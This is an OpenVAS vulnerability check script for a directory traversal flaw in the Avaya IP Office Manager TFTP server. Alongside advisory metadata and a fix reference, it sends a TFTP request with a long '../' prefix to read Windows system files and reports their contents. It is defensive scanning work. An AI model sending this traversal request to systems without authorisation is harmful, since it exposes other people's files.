###############################################################################
# OpenVAS Vulnerability Test
#
# Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802027");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=225");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48272");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17507");
  script_xref(name:"URL", value:"http://support.avaya.com/css/P8/documents/100141179");
  script_xref(name:"URL", value:"http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files on the
  affected application.");

  script_tag(name:"affected", value:"Avaya IP Office Manager TFTP Server Version 8.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests containing
  'dot dot' sequences (..), which can be exploited to download arbitrary files from the host system.");

  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");

  script_tag(name:"summary", value:"Avaya IP Office Manager TFTP Server is prone to a directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("tftp.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_has_reliable_get(port:port))
  exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  res = tftp_get(port:port, path:"../../../../../../../../../../../../" + files[file]);
  if(!res)
    continue;

  if (egrep(pattern:file, string:res, icase:TRUE)) {
    report = string("The " + files[file] + " file contains:\n", res);
    security_message(port:port, data:report, proto:"udp");
    exit(0);
  }
}

exit(99);
